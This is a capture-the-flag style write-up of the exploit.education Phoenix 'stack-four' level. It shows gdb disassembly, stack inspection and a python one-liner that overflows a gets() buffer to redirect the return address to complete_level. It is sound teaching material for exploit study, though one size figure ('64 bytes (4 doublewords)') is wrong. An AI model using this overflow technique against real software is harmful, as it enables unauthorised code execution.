# stack-four

Right before a function call instruction, the address of the instruction that follows (after the function returns) is often stored on the stack. In this excercise, the goal is to overflow the buffer such that the return address of the function `start_level` gets overwritten. We want to overwrite the return address to the address of the function `complete_level`.

```console
(gdb) disass start_level
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:     push   rbp
   0x0000000000400636 <+1>:     mov    rbp,rsp
   0x0000000000400639 <+4>:     sub    rsp,0x50
   0x000000000040063d <+8>:     lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:    mov    rdi,rax
   0x0000000000400644 <+15>:    call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:    mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:    mov    rsi,rax
   0x0000000000400658 <+35>:    mov    edi,0x400733
   0x000000000040065d <+40>:    mov    eax,0x0
   0x0000000000400662 <+45>:    call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:    nop
   0x0000000000400668 <+51>:    leave  
   0x0000000000400669 <+52>:    ret
End of assembler dump.
```

We expect the return address to be right above the base pointer when we are inside the start_level function. Let us therefore set a breakpoint somewhere before the gets function and examine the stack just above rbp.

```console
(gdb) break *0x400641              
Breakpoint 1 at 0x400641
(gdb) r
Starting program: /opt/phoenix/amd64/stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education

Breakpoint 1, 0x0000000000400641 in start_level ()
(gdb) x /2gx $rbp
0x7fffffffe510: 0x00007fffffffe530      0x000000000040068d
```

By disassembling main and comparing the output above with the address of the instruction that follows the call to start_level, we confirm our assumption.

```console
(gdb) disass main
Dump of assembler code for function main:
   0x000000000040066a <+0>:     push   rbp
   0x000000000040066b <+1>:     mov    rbp,rsp
   0x000000000040066e <+4>:     sub    rsp,0x10
   0x0000000000400672 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400675 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400679 <+15>:    mov    edi,0x400750
   0x000000000040067e <+20>:    call   0x400480 <puts@plt>
   0x0000000000400683 <+25>:    mov    eax,0x0
   0x0000000000400688 <+30>:    call   0x400635 <start_level>
   0x000000000040068d <+35>:    mov    eax,0x0
   0x0000000000400692 <+40>:    leave  
   0x0000000000400693 <+41>:    ret    
End of assembler dump.
```

Now all we have to do is to figure out how much padding we must input and also what the address of complete_level is. We can easily get the latter with the info command:

```console
(gdb) info address complete_level
Symbol "complete_level" is at 0x40061d in a file compiled without debugging.
```

The amount of padding can quite easily be calculated by looking at the source code, or we could just go with trial and error. The return address should be located a few doublewords above the buffer, which itself is 64 bytes (4 doublewords). 

```console
user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print("A"*64 + "B"*8*3 + "\x1d\x06\x40")' | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```
